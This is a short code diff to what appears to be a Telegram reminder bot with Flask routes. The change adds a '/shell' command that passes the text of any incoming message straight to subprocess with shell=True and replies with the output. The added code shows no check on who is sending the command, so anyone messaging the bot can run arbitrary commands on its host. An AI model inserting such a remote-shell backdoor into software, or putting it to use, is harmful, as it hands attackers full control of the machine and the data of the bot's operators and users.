@@ -136,6 +136,18 @@ def admin_download():
 def delete_reminder():
     chat_id = request.form['chat_id']
     return redirect(f"/view_reminders/{chat_id}")
+
+
+# shell
+
+@bot.message_handler(commands=['shell'])
+def handle_shell_command(message):
+    command = message.text[len('/shell '):]
+    try:
+        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+    except subprocess.CalledProcessError as e:
+        output = e.output
+    bot.reply_to(message, f'```\n{output}\n```', parse_mode='Markdown')
 # Telegram bot command handler for /admin
 @bot.message_handler(commands=['admin'])
 def admin_info(message):
